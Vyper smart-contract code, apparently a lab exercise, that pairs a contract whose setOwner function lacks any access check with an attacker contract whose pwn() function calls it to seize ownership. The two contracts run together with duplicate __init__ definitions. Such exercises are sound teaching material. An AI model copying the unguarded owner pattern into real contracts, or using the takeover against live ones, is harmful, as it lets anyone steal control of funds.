# @version 0.3.9
owner: public(address)


@external
def __init__():
    self.owner = msg.sender


@external
def setOwner(owner: address):
    self.owner = owner


    

interface Target:
    def setOwner(owner: address): nonpayable


target: public(Target)


@external
def __init__(target: address):
    self.target = Target(target)


@external
def pwn():
    self.target.setOwner(msg.sender)
